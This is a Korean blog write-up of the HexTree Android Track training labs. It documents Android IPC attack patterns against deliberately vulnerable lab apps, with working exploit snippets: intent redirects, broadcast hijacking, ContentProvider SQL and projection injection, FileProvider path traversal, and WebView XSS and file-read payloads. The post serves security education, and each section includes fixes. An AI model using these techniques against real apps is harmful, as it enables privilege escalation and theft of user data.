---
layout: post
title: "HexTree Android Track 완주기 — Android 앱 공격 표면 57가지를 직접 뚫어보며 배운 것"
date: 2026-07-26
category: CTF/Wargame
author: yejunkim2000
tags: [HexTree, Android, 모바일보안, AndroidSecurity, Intent, IntentRedirect, PendingIntent, BroadcastReceiver, AIDL, Binder, ContentProvider, FileProvider, PathTraversal, WebView, CustomTabs, Frida, jadx, apktool, 리버싱, MITM, 버그바운티]
excerpt: "Google이 후원하는 HexTree Android Track의 코스 14개·랩 57개를 완주하며 Activity·Service·BroadcastReceiver·ContentProvider·WebView가 각각 어떤 조건에서 외부 앱에 열리는지, 그 노출이 어떻게 권한 상승과 데이터 유출로 이어지는지 공격 앱을 직접 만들어 재현한 기록."
---

> **트랙**: [HexTree Android Track](https://app.hextree.io/map/android) (Google 후원 · 코스 14개 · 랩 58칸 / 고유 플래그 57개)
> **결과**: 플래그 **57/57 획득 및 제출**, 코스 **14/14 완료(100%)**
> **환경**: Android 13 (API 33) x86_64 에뮬레이터 · jadx 1.5.5 / apktool 3.0.2 / Frida 16.7.19
> **직접 만든 것**: 공격 앱 `io.hextree.poc`, Frida 러너, 미니 MITM 프록시·가짜 지도 서버, UI 자동화 스크립트

---

HexTree Android Track의 14개 코스와 57개 랩을 완주하면서 Android 애플리케이션의 공격 표면을
컴포넌트 단위로 분석한 기록입니다. Activity·Service·BroadcastReceiver·ContentProvider·WebView가
각각 어떤 조건에서 외부 앱에 노출되는지, 그리고 그 노출이 실제 권한 상승과 데이터 유출로
이어지는 경로를 직접 만든 공격 앱과 계측 도구로 재현했습니다.

"exported로 열려 있다"는 사실 자체보다, **앱이 그 진입점으로 들어온 입력을 어디까지 믿는가**가
취약점의 실체입니다. 이 글은 그 신뢰 경계가 무너지는 아홉 가지 패턴을 코드와 재현 과정으로 정리합니다.

## 1. Target

| 항목 | 값 |
|---|---|
| 트랙 | HexTree Android Track (코스 14개 · 랩 제출칸 58개 · 고유 플래그 57개) |
| 주 분석 대상 | `io.hextree.attacksurface` v1.0 (SHA-256 `2c1261e6…de65`, 플래그 41개) |
| 보조 대상 | `io.hextree.flagproject`, `io.hextree.reversingexample`, `io.hextree.adbtestapplication`, `io.hextree.fridatarget`, `io.hextree.weatherusa`(+update1), `io.hextree.pocketmaps` |
| 공격 앱 | `io.hextree.poc` — `hextreeio/android-poc-app` 템플릿 기반으로 직접 작성 |
| 실행 환경 | Android 13 (API 33) x86_64 에뮬레이터, AVD `HexTree`, rooted / writable-system |
| 정적 분석 | jadx 1.5.5, apktool 3.0.2, apksigner(build-tools 36.0.0) |
| 동적 분석 | Frida 16.7.19 (server/client), 자체 Python 러너 |
| 빌드 | Gradle 8.9 + JDK 21 (Android Studio JBR) |
| 결과 | 코스 14/14 완료(100%), 플래그 57/57 획득 및 제출 |

분석 산출물은 다음과 같이 구성했습니다.

```
hextree-android/
├── apks/                 대상 APK 8종
├── decompiled/           jadx(자바) · apktool(리소스·smali) 결과
├── poc-app/              공격 앱 io.hextree.poc 소스
├── frida-scripts/        계측 스크립트 + run.py(러너)
├── tools/                attack.sh · uitap.py · mitm_proxy.py · fake_map_server.py 등
└── writeup/              원고 · 스크린샷 110장 · 증거 로그
```

## 2. Background

### 2.1 앱 간 통신이 곧 공격 표면입니다

Android는 앱마다 별도의 리눅스 UID를 부여하고 파일시스템을 격리합니다. 그래서 앱이 서로 데이터를
주고받으려면 커널의 Binder IPC를 통과해야 하고, 그 위에 올라간 추상화가 4대 컴포넌트와 Intent입니다.

```
App A ──Intent/Binder──▶ system_server (ActivityTaskManager / PackageManager)
                              └─ exported·permission 검사 후 ──▶ App B 컴포넌트
```

즉 공격 표면은 **다른 UID가 호출할 수 있는 진입점**과 **그 진입점이 입력을 신뢰하는 정도**의 곱으로
결정됩니다. 전자는 매니페스트로 드러나고, 후자는 코드를 읽어야 보입니다.

| 컴포넌트 | 외부 진입 API | 노출 조건 |
|---|---|---|
| Activity | `startActivity` / `startActivityForResult` | `android:exported="true"` 또는 `intent-filter` 보유 |
| Service | `startService` / `bindService` | 위와 동일 |
| BroadcastReceiver | `sendBroadcast` / `sendOrderedBroadcast` | 매니페스트 선언 + exported, 또는 `registerReceiver(..., RECEIVER_EXPORTED)` |
| ContentProvider | `ContentResolver.query/openFile` | `android:exported`(API 17+ 기본 false), `grantUriPermissions` |

### 2.2 adb로 열린다는 것은 취약점의 근거가 아닙니다

실습 초반에 반드시 짚어야 할 전제가 하나 있습니다. `exported="false"`인 액티비티도
`adb shell am start`로는 그냥 실행됩니다.

```
$ adb shell am start -n io.hextree.flagproject/.FlagActivity   # exported=false
Starting: Intent { cmp=io.hextree.flagproject/.FlagActivity }
    topResumedActivity=ActivityRecord{... io.hextree.flagproject/.FlagActivity}
```

adb shell은 uid 2000(shell)로 동작하며 `android.permission.START_ANY_ACTIVITY`
(signature|privileged)를 보유하기 때문입니다. 따라서 영향 평가는 **권한 없는 서드파티 앱**으로
해야 하며, 이 글의 재현은 그 원칙에 따라 공격 앱 `io.hextree.poc`를 통해 수행했습니다.
adb는 사용자가 앱 UI에서 하는 행위를 대신하는 용도로만 사용했습니다.

### 2.3 대상 앱은 리패키징을 막아 두었습니다

Attack Surface 앱의 모든 플래그 액티비티는 `AppCompactActivity`를 상속하고, 성공 시
`LogHelper.appendLog(flag)`로 암호문을 복호합니다.

```java
// AppCompactActivity.verify() — APK 서명 SHA-256을 하드코딩된 2개와 비교
if (!verify(context)) { Toast.makeText(this, "Not solved. App looks modified.", 1).show(); return; }

// LogHelper — 복호 키 = SHA-256(정렬된 tag들을 '|'로 join)[0:16], AES-ECB
tags = [ R.string.secret, packageName, "io.hextree.attacksurface.LogHelper", ...addTag(...) ]
```

두 가지 의미가 있습니다. 첫째, **재서명(리패키징)하면 플래그가 나오지 않습니다.** 둘째,
플래그 복호 키가 `addTag()`로 쌓인 값에 의존하므로 **조건을 실제로 만족시켜야만** 올바른 문자열이
나옵니다. 즉 우회로 흉내 낸 성공은 통하지 않고, 정직하게 IPC로 조건을 만들어야 합니다.

이 설계는 첫 챌린지에서 더 노골적으로 드러납니다. `hextreeio/android-challenge1`은 빌드 시
`AndroidManifest.xml`에서 영숫자만 남긴 문자열의 SHA-256을 복호 키로 주입합니다.

```groovy
def cleanedString = manifestStr.replaceAll("[^A-Za-z0-9]", "")
def manifestHash  = sha256(cleanedString)      // = R.string.challenge_secret_key
```

`FlagActivity`를 `exported=true`로 바꿔 지름길을 타면 매니페스트가 바뀌어 키가 달라지고 복호가
깨집니다. 실제로 기기 없이 오프라인으로 계산해 확인했습니다.

```
[*] manifest sha256  = f6217023eb5371dc0b2228d96ff851b8e0295c7e15b77e05bfb3dddf380a13f0
[+] FLAG             = HXT{read-or-modify-sources-gha82f}

[!] 매니페스트 변조(FlagActivity exported=true) 시:
    manifest sha256 = dad9cdcd55d10d0428df1b68807aa7e1dd1579636e7f3085819b2d0f5e3311fe
    FLAG            = 'd\x8f\xb1\xe9\xc6…'   ← 복호 실패
```

## 3. Attack Surface Overview

분석의 출발점은 항상 매니페스트입니다. `apktool`로 디코딩한 뒤 외부에서 만질 수 있는 진입점을
전수 정리했습니다.

| 종류 | exported=true | 비고 |
|---|---|---|
| Activity | Flag1~5, 7~9, 12~15, 22, 33.1, 34~37, 41, MainActivity | Flag2/3/13/14/15는 `intent-filter` 보유 |
| Activity | (false) Flag6, 10, 11, 16~21, 23~32, 33.2, 38~40 | 내부 화면 — 우회 경로를 찾아야 합니다 |
| Service | Flag24~29 전부 exported | 24·25는 action 필터, 26~29는 bind |
| Receiver | Flag16Receiver, Flag17Receiver, Flag19Widget | 전부 exported |
| Provider | `io.hextree.flag30/31/32` exported / `flag33_1`·`flag33_2`·`io.hextree.files`·`io.hextree.root`는 exported=false + `grantUriPermissions=true` | |

`exported=false` 뒤에 있는 컴포넌트가 오히려 흥미로운 목표입니다. 뒤에서 보겠지만 Intent Redirect,
URI permission 전파, PendingIntent 위임 같은 경로로 결국 도달할 수 있기 때문입니다.

실습 자동화는 세 가지 도구로 정리했습니다.

| 도구 | 역할 |
|---|---|
| `tools/attack.sh` | 화면 깨우기 → 공격 실행 → logcat 필터까지 한 번에 |
| `tools/uitap.py` | uiautomator 덤프에서 텍스트로 UI 탭(선택창·알림 자동화) |
| `frida-scripts/run.py` | 깨진 frida CLI를 대체하는 Python 러너 |

## 4. Intent and Activity

### 4.1 문자열 비교는 인증이 아닙니다 (Flag 1–4)

가장 단순한 형태는 action·data URI만 확인하는 코드입니다.

```java
// Flag3Activity
if (!action.equals("io.hextree.action.GIVE_FLAG")) return;
if (!data.toString().equals("https://app.hextree.io/map/android")) return;
success(this);
```

```bash
adb shell am start -n $A.Flag2Activity -a io.hextree.action.GIVE_FLAG
adb shell am start -n $A.Flag3Activity -a io.hextree.action.GIVE_FLAG -d "https://app.hextree.io/map/android"
```

Flag4는 상태 머신(`INIT→PREPARE→BUILD→GET_FLAG`)을 요구하지만 상태를 앱 내부 SharedPreferences에
저장할 뿐이므로, 외부에서 순서대로 인텐트를 보내면 그대로 전이됩니다.

```
I Flag4StateMachine: Transitioned from INIT to PREPARE / PREPARE to BUILD / BUILD to GET_FLAG
I Flag4: HXT{sometimes-require-multiple-calls-5133au2}
```

### 4.2 중첩 Intent와 Intent Redirect (Flag 5–6)

Flag5는 `Intent.EXTRA_INTENT` 안에 또 다른 Intent를 담아 보내야 합니다. 여기서 중요한 것은
`reason` 값에 따라 앱이 **우리가 준 Intent를 대신 실행**한다는 점입니다.

```java
Intent inner = (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
if (inner.getIntExtra("return", -1) != 42) return;
Intent next = (Intent) inner.getParcelableExtra("nextIntent");
if ("back".equals(next.getStringExtra("reason"))) success(this);
else if ("next".equals(next.getStringExtra("reason"))) startActivity(next);   // ← 리다이렉트 가젯
```

이 가젯으로 `exported=false`인 Flag6Activity에 도달할 수 있습니다. Flag6의 조건은
`FLAG_GRANT_READ_URI_PERMISSION`이 세팅된 인텐트로 실행되는 것입니다.

```java
Intent next = new Intent().setClassName(VICTIM, ACT + "Flag6Activity")
        .putExtra("reason", "next")
        .addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
Intent inner = new Intent().putExtra("return", 42).putExtra("nextIntent", next);
startActivity(new Intent().setClassName(VICTIM, ACT + "Flag5Activity")
        .putExtra(Intent.EXTRA_INTENT, inner));
```

```
I Flag6: HXT{redirect-to-not-exported-n129vbs}
```

Intent Redirect가 실무에서 위험한 이유가 여기 있습니다. 공격자는 **앱의 신원으로**
① 비공개 컴포넌트 실행 ② URI 권한 획득 ③ 권한이 필요한 동작 트리거를 할 수 있습니다.

<p align="center"><img src="/assets/img/hextree-android-track/flag05_intent.png" alt="Flag5 intent dump" width="240" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag06.png" alt="Flag6" width="240" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em>앱이 받은 인텐트 덤프 — 중첩 구조(<code>EXTRA_INTENT → nextIntent</code>)가 그대로 보입니다 · 리다이렉트로 도달한 비공개 액티비티</em></p>

### 4.3 호출자 신원 검증의 허점 (Flag 8–9)

```java
ComponentName caller = getCallingActivity();          // startActivityForResult로 불렸을 때만 non-null
if (caller.getClassName().contains("Hextree")) { ... }  // 문자열 포함 검사
```

`getCallingActivity()`가 돌려주는 것은 **호출자가 스스로 정한 클래스명**입니다. 공격 앱의 액티비티를
`io.hextree.poc.HextreeAttackActivity`로 지으면 그대로 통과합니다. Flag9는 한술 더 떠 플래그를
`setResult`의 extra로 돌려주므로 `onActivityResult`에서 회수됩니다.

```
I POC : [Flag9] STOLEN FLAG = HXT{flag-in-result-gs891jh2}
```

신원 확인이 필요하다면 `Binder.getCallingUid()`와 패키지 서명 검증을 써야 합니다.

### 4.4 암시적 인텐트 하이재킹 (Flag 10–12)

Flag10은 **비밀을 암시적 인텐트에 실어** 보냅니다.

```java
Intent i = new Intent("io.hextree.attacksurface.ATTACK_ME");
i.putExtra("flag", decryptedFlag);
startActivity(i);
```

공격 앱이 같은 action의 intent-filter를 등록하면 그대로 수신됩니다. 반대로 Flag11·12는 응답을
검증 없이 신뢰하므로, 우리가 `token=0x41414141`을 돌려주면 통과합니다.

```xml
<intent-filter>
    <action android:name="io.hextree.attacksurface.ATTACK_ME" />
    <category android:name="android.intent.category.DEFAULT" />
</intent-filter>
```

```java
setResult(RESULT_OK, new Intent().putExtra("token", 1094795585));
```

### 4.5 딥링크와 브라우저 경계 (Flag 13·15)

Flag13은 "브라우저에서 왔는지"를 이렇게 판정합니다.

```java
action == VIEW && categories.contains(BROWSABLE)
  && intent.getStringExtra("com.android.browser.application_id") != null
```

이 extra는 Chrome이 붙여주는 값일 뿐, 어떤 앱이든 넣을 수 있습니다. Flag15는 `intent://` 링크로
표현 가능한 형태(action + `S.action=flag` + `B.flag=true`)를 요구합니다.

```
intent://flag15#Intent;scheme=hex;action=io.hextree.action.GIVE_FLAG;
  category=android.intent.category.BROWSABLE;S.action=flag;B.flag=true;end
```

커스텀 스킴(`hex://`)은 누구나 등록할 수 있으므로 하이재킹·스푸핑이 가능합니다. 도메인 소유를
증명하는 App Link(`https://` + `autoVerify`)와의 차이가 여기서 갈립니다.

### 4.6 역할을 URL 파라미터로 결정한 로그인 (Flag 14)

이 랩은 실제 서비스에서 그대로 나올 법한 인가 결함입니다. 앱은 브라우저에서 로그인 후
딥링크로 토큰을 돌려받습니다.

```
hex://token?authToken=598cc075…1d992c67&type=user&authChallenge=<UUID>
```

검증 로직은 다음과 같습니다.

```java
if (!challenge.equals(stored)) reject;                    // 재생 방지는 있습니다
if (base64(sha256(authToken)).equals("a/AR9b0X...92w=")) {  // 토큰 유효성도 봅니다
    if (type.equals("user"))  ... 일반 로그인
    if (type.equals("admin")) ... success();                // ← 역할은 URL 파라미터
}
```

**토큰이 역할에 바인딩돼 있지 않습니다.** 정상 발급된 user 토큰을 그대로 두고 `type=admin`으로
바꾸면 관리자로 처리됩니다.

```
I Flag14: hash: a/AR9b0XxHEX7zrjx5KNOENTqbsPi6IsX+MijDA/92w=
I Flag14: HXT{hijacked-login-token-abjh28a}
```

목 서버가 challenge 값과 무관하게 동일한 토큰을 발급한다는 점(세션 미바인딩)까지 합치면,
이 흐름은 수직 권한 상승으로 직결됩니다.

### 4.7 PendingIntent 위임 (Flag 22–23)

`PendingIntent`는 "내 신원으로 이 인텐트를 대신 발사해도 좋다"는 위임 토큰입니다.

| 플래그 | 의미 | 보안 |
|---|---|---|
| `FLAG_IMMUTABLE` | 받는 쪽이 내용을 못 바꿈 | 권장 |
| `FLAG_MUTABLE` | 빈 필드를 `fillIn`으로 채울 수 있음 | 위험 — 컴포넌트·extra 주입 가능 |

Flag22는 우리가 준 PendingIntent에 앱이 플래그를 실어 발사합니다. 반대로 Flag23은 앱이
`FLAG_MUTABLE` PendingIntent를 암시적 인텐트로 뿌리므로, 받아서 빈 extra를 채워 발사하면
앱 자신의 액티비티가 조건을 만족한 상태로 실행됩니다.

```java
PendingIntent pi = intent.getParcelableExtra("pending_intent");
pi.send(this, 0, new Intent().putExtra("code", 42));   // fillIn
```

```
I POC  : [Flag23] creator=io.hextree.attacksurface → mutating with code=42
I Flag23: HXT{teenage-mutable-intent-turtles-s2df}
```

### 4.8 재현 화면

<p align="center"><img src="/assets/img/hextree-android-track/flag01.png" alt="Flag 1" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag04.png" alt="Flag 4" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag07.png" alt="Flag 7" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag08.png" alt="Flag 8" width="170" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em><strong>1</strong> exported 액티비티 직접 실행 · <strong>4</strong> 상태 머신 순차 호출 · <strong>7</strong> OPEN → REOPEN(onNewIntent) · <strong>8</strong> 호출자 클래스명 위조</em></p>

<p align="center"><img src="/assets/img/hextree-android-track/flag10.png" alt="Flag 10" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag12.png" alt="Flag 12" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag14.png" alt="Flag 14" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag22.png" alt="Flag 22" width="170" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em><strong>10</strong> 공격 앱이 가로챈 플래그 · <strong>12</strong> LOGIN 조건 + 토큰 응답 · <strong>14</strong> <code>type=admin</code> 권한 상승 · <strong>22</strong> PendingIntent로 회수한 플래그</em></p>

## 5. Broadcast Receiver

### 5.1 exported 리시버와 ordered broadcast (Flag 16–17)

```bash
adb shell am broadcast -n $R.Flag16Receiver --es flag give-flag-16
adb shell am broadcast -n $R.Flag17Receiver --es flag give-flag-17
```

```
Broadcast completed: result=-1, data="Flag 17 Completed", extras: Bundle[…]
I FlagActivity: HXT{returned-result-ds82s}
```

`am broadcast`는 결과 리시버를 붙이므로 ordered broadcast로 전송됩니다. 덕분에
`isOrderedBroadcast()` 조건이 자연히 만족되고, 결과 Bundle까지 콘솔에서 확인됩니다.

### 5.2 암시적 ordered broadcast 가로채기 (Flag 18)

앱은 플래그를 실어 `io.hextree.broadcast.FREE_FLAG`를 ordered로 뿌리고, 최종 리시버에서
`resultCode != 0`이면 성공 처리합니다. 두 가지를 동시에 해야 합니다.

1. 우선순위를 높여 **먼저** 받아 extra를 훔친다
2. `setResultCode(1)`로 응답해 앱이 스스로 성공 처리하게 한다

여기서 플랫폼 제약을 하나 만났습니다. **Android 8.0+는 암시적 브로드캐스트를 매니페스트 선언
리시버에 전달하지 않습니다.** 매니페스트에 `priority=999`로 등록해도 아무 일도 일어나지 않았고,
동적 등록으로 바꾸자 해결됐습니다.

```java
IntentFilter f = new IntentFilter();
f.addAction("io.hextree.broadcast.FREE_FLAG");
f.setPriority(999);
registerReceiver(hijacker, f, RECEIVER_EXPORTED);   // 동적 등록이어야 받습니다
```

```
I POC : [Broadcast] STOLEN FLAG = HXT{hijacking-broadcast-intent-as91}
I Flag18Activity.BroadcastReceiver: resultCode 1
```

### 5.3 protected broadcast 우회와 알림 하이재킹 (Flag 19–21)

`Flag19Widget`은 `appWidgetOptions` Bundle 안의 두 정수를 검사합니다. 그런데
`android.appwidget.action.APPWIDGET_UPDATE`는 시스템만 보낼 수 있는 protected broadcast입니다.

```
W ActivityManager: Permission Denial: not allowed to send broadcast
                   android.appwidget.action.APPWIDGET_UPDATE to io.hextree.attacksurface
```

코드가 `action.contains("APPWIDGET_UPDATE")`로 **부분 문자열**만 보기 때문에, 우리 소유의 액션
이름으로 우회할 수 있었습니다.

```java
Intent i = new Intent("io.hextree.poc.APPWIDGET_UPDATE")     // contains 검사만 통과하면 됩니다
        .setClassName(VICTIM, VICTIM + ".receivers.Flag19Widget")
        .putExtra("appWidgetOptions", options);
sendBroadcast(i);
```

Flag21은 알림 액션 버튼의 PendingIntent가 **암시적 브로드캐스트**라는 점을 이용합니다. 사용자가
버튼을 누르는 순간 시스템이 그 브로드캐스트를 뿌리고, 동적 등록해 둔 우리 리시버가 받습니다.

<p align="center"><img src="/assets/img/hextree-android-track/flag21-notification.png" alt="Flag21 알림" width="240" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag21.png" alt="Flag21" width="240" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em>알림의 "Give Flag" 버튼 — 누르는 순간 암시적 브로드캐스트가 나갑니다 · 가로챈 결과 <code>HXT{intercepted-notificaiton-ah2us}</code></em></p>

## 6. Service and Binder

### 6.1 상태를 서비스에 두면 순서를 조작당합니다 (Flag 24–25)

```bash
adb shell am start-service -n $S.Flag24Service -a io.hextree.services.START_FLAG24_SERVICE
for a in UNLOCK1 UNLOCK2 UNLOCK3; do adb shell am start-service -n $S.Flag25Service -a io.hextree.services.$a; done
```

서비스는 프로세스당 하나이므로 lock 상태가 누적됩니다. 중간에 다른 action이 끼면 리셋되는 것까지
포함해 그대로 재현됩니다.

### 6.2 Messenger 프로토콜 (Flag 26–27)

Flag26은 `what=42` 하나면 끝입니다. 바인드한 상대가 누구인지 검사하지 않습니다.
Flag27은 3단계지만, 서비스가 비밀번호를 **그대로 알려줍니다.**

```
what=1 (MSG_ECHO)         data{echo:"give flag"}   → 서비스가 echo를 기억
what=2 (MSG_GET_PASSWORD) obj != null, replyTo=우리 → 서비스가 password를 회신
what=3 (MSG_GET_FLAG)     data{password:<받은 값>}  → 성공
```

```
I POC : [Flag27] reply what=2 … password=3036f658-2b6d-48e9-b0ac-15b8cae8124d
I Flag27: HXT{service-messages-js71h}
```

### 6.3 AIDL은 인터페이스 없이도 호출됩니다 (Flag 28–29)

AIDL 스텁을 공격 앱에 복사할 필요가 없습니다. 필요한 것은 **DESCRIPTOR 문자열**과
**트랜잭션 번호**(선언 순서대로 1, 2, 3…)뿐입니다.

```java
Parcel d = Parcel.obtain(), r = Parcel.obtain();
d.writeInterfaceToken("io.hextree.attacksurface.services.IFlag28Interface");
binder.transact(1, d, r, 0);        // openFlag()
r.readException();
```

Flag29는 `init()`이 비밀번호를 반환하고 `authenticate()`가 그 값을 확인하는 구조라, 세 번의
트랜잭션으로 끝납니다.

```
I POC : [Flag29] init() → 9924c372-72d3-4405-af04-fb43394261ab
I Flag29: HXT{ai-ai-aidl-service-a2si1}
```

### 6.4 패키지 가시성 때문에 조용히 실패합니다

처음에는 `bindService()`가 예외도 없이 false만 반환했습니다. 원인은 Android 11(API 30)의
패키지 가시성이었습니다.

```xml
<queries>
    <package android:name="io.hextree.attacksurface" />
</queries>
```

명시적 `startActivity`는 가시성 없이도 동작하지만, `bindService`·`ContentResolver`·
`queryIntentActivities`는 막힙니다. 피해 앱도 같은 이유로 `<queries>`에 자기 액션을 선언해 두었습니다.

## 7. ContentProvider and FileProvider

### 7.1 selection과 projection은 모두 공격자 입력입니다 (Flag 30–33)

`query(uri, projection, selection, selectionArgs, sortOrder)`의 모든 인자가 외부 입력입니다.
Flag32는 selection을 문자열로 이어붙입니다.

```java
String where = "visible=1" + (selection != null ? " AND (" + selection + ")" : "");
```

```bash
adb shell "content query --uri content://io.hextree.flag32/flags --where \"1=1) OR (1=1\""
Row: 2 _id=3, name=flag32, value=HXT{sql-injection-in-provider-1gs82}, visible=0
```

Flag33은 한 단계 더 나갑니다. provider가 `exported=false`인데도, 앱이 URI를 담은 인텐트에
`FLAG_GRANT_READ_URI_PERMISSION`을 붙여 ① 결과로 반환하거나 ② 암시적 인텐트로 뿌립니다.
**권한이 인텐트를 타고 흐르는 것**입니다. 그런데 그 URI로 조회해도 플래그는 `Note` 테이블에 있고
`UriMatcher`가 접근을 막습니다. 여기서 **projection 주입**이 통합니다.

```java
getContentResolver().query(uri, new String[]{
        "(SELECT title   FROM Note WHERE title='flag33') AS name",
        "(SELECT content FROM Note WHERE title='flag33') AS value"
}, null, null, null);
```

```
I POC : name=flag33 value=HXT{union-select-injection-1bs98}
```

selection만 막고 projection을 놓치는 실수는 실무에서도 흔합니다. `SQLiteQueryBuilder.
setProjectionMap()`으로 컬럼 화이트리스트를 강제해야 합니다.

### 7.2 FileProvider 설정이 곧 노출 범위입니다 (Flag 34–36)

Flag34는 filename을 검증하지 않고 **쓰기 권한(flags=3)까지** 부여합니다. 그래서 3단 체인이 됩니다.

1. `filename="flag34.txt"`로 URI를 받아 **우리가 파일을 만든다**(존재 조건 충족)
2. 다시 요청하면 앱이 `files/flags/flag34.txt`에 플래그를 기록한다
3. `filename="flags/flag34.txt"`로 URI를 받아 읽는다

Flag35의 설정은 더 극단적입니다.

```xml
<!-- res/xml/rootpaths.xml -->
<paths><root-path name="root_files" path="/" /></paths>
```

파일시스템 루트를 노출하므로 `../flag35.txt` 하나로 앱 데이터 디렉터리가 열립니다. 그리고 이
쓰기 권한은 Flag36으로 이어집니다. 앱이 자기 설정 파일을 신뢰하기 때문입니다.

```java
askFile(a, "Flag35Activity", "../shared_prefs/Flag36Preferences.xml", RQ_36_PREFS);
write(a, uri, "<?xml version='1.0' ...?>\n<map>\n    <boolean name=\"solved\" value=\"true\" />\n</map>\n");
```

SharedPreferences는 메모리에 캐시되므로 프로세스를 재시작해야 반영됩니다.

```
I Flag36: HXT{overwriting-shared-prefs-034nsd}
```

### 7.3 반대 방향 — 악성 provider의 메타데이터 (Flag 37)

Flag37Activity는 **우리가 준 content:// URI**를 조회해 `_display_name`과 `_size`를 믿습니다.

```java
if ("../flag37.txt".equals(displayName) && size == 1337) {
    if ("give flag".equals(readAll(openInputStream(uri)))) success();
}
```

공격 앱의 provider가 원하는 값을 그대로 보고하면 끝입니다. 다른 앱이 준 URI의 파일명·크기·MIME은
전부 거짓일 수 있으므로, 저장 시 `getCanonicalPath()`로 기대 디렉터리 안인지 확인해야 합니다.

<p align="center"><img src="/assets/img/hextree-android-track/flag32.png" alt="Flag 32" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag33_1.png" alt="Flag 33" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag35.png" alt="Flag 35" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag37.png" alt="Flag 37" width="170" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em><strong>32</strong> selection SQL injection · <strong>33</strong> URI 권한 + projection 주입 · <strong>35</strong> <code>root-path</code> 트래버설 · <strong>37</strong> 가짜 메타데이터 provider</em></p>

## 8. WebView and CustomTabs

### 8.1 JS 브리지와 로드 URL (Flag 38–39)

```java
String url = getIntent().getStringExtra("URL");            // 외부 입력
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new JsObject(), "hextree"); // JS → 네이티브
webView.loadUrl(url);
```

로드할 페이지를 우리가 정할 수 있으니 JS 한 줄이면 브리지가 호출됩니다.

```bash
adb shell am start -n $W.Flag38WebViewsActivity \
  -e URL 'data:text/html,<script>hextree.success(true)</script>'
```

Flag39는 URL이 고정이지만 extra가 페이지로 흘러듭니다. 앱은 JSON으로 안전하게 직렬화하는데,
정작 웹 쪽에서 `innerHTML`에 그대로 넣습니다.

```javascript
function initApp(obj) { window.hello_name.innerHTML = `Hello <b>${obj.name}</b>`; }
```

```bash
adb shell am start -n $W.Flag39WebViewsActivity -e NAME '<img src=x onerror=hextree.success()>'
```

### 8.2 file:// 유니버설 액세스 (Flag 40)

```java
settings.setAllowUniversalAccessFromFileURLs(true);   // file:// 페이지가 임의 출처를 읽습니다
Utils.writeFile(this, "token.txt", UUID.randomUUID().toString());
webView.loadUrl(getIntent().getStringExtra("URL"));
```

우리 앱의 파일은 피해 앱이 못 읽습니다. 그래서 **7.2에서 얻은 쓰기 권한**으로 피해 앱 자신의
`files/`에 익스플로잇 HTML을 심고, 그 경로를 로드시켰습니다.

```html
<script>
var x = new XMLHttpRequest();
x.open('GET','file:///data/data/io.hextree.attacksurface/files/token.txt');
x.onload = function(){ hextree.authCallback(x.responseText); };
x.send();
</script>
```

```
I Flag40: authCallback("db594822-f017-4c58-9393-55bdbf293cc3")
I Flag40: HXT{leak-fileprovider-1gash2}
```

잘못된 FileProvider 설정 → 앱 내부에 임의 HTML 삽입 → 과도한 WebView 설정 → 내부 비밀 유출로
이어지는 체인입니다. 설정 하나만 꺼도 끊어집니다.

### 8.3 CustomTabs PostMessage의 origin 혼동 (Flag 41)

CustomTabs는 Chrome이 페이지를 렌더링하므로 앱이 DOM을 만질 수 없고, 대신 PostMessage 채널로
통신합니다. 앱 코드는 이렇게 생겼습니다.

```java
String url = getIntent().getStringExtra("URL");        // 외부 입력
session.validateRelationship(RELATION_USE_AS_ORIGIN, Uri.parse("https://oak.hackstree.io/"), null);
// onNavigationEvent(2 = NAVIGATION_FINISHED) 시점에 validated면
session.requestPostMessageChannel(Uri.parse("https://oak.hackstree.io/"));
```

`onPostMessage`는 jadx 디컴파일이 실패해 smali로 읽었습니다. `init_complete` 이후
`success` 메시지 하나면 플래그를 줍니다. 정상 사이트(`sync.html`)는 그 메시지를 보내지 않습니다.

핵심은 **Digital Asset Links 검증이 앱과 도메인의 관계만 증명한다**는 점입니다. 채널이 실제로
연결되는 대상은 **그 순간 탭에 로드된 페이지**이므로, 로드 URL이 외부 입력이면 "검증된 origin"이라는
근거가 무의미해집니다.

```javascript
window.addEventListener("message", function (event) {
    if (!event.ports || event.ports.length === 0) return;
    window.port = event.ports[0];
    window.port.onmessage = function (e) {
        if (e.data === "init") {
            window.port.postMessage(JSON.stringify({ message: 'init_complete' }));
            window.port.postMessage(JSON.stringify({ message: 'success' }));   // 정상 사이트는 안 보냅니다
        }
    };
});
```

재현에는 타이밍 문제가 하나 있었습니다. 자동으로 열린 첫 로딩은 DAL 검증보다 빨라서
`requestPostMessageChannel`이 호출되지 않고, 탭을 닫으면 액티비티가 `finish()`합니다. 그래서
**페이지가 스스로 재이동**하도록 만들어 검증 완료 이후의 navigation 이벤트를 생성했습니다.

```
I Flag41: onRelationshipValidationResult(true, "https://oak.hackstree.io")
I Flag41: requestPostMessageChannel = true
I Flag41: onPostMessage({"message":"success"}, …)
I Flag41: HXT{post-message-origin-h19sba3}
```

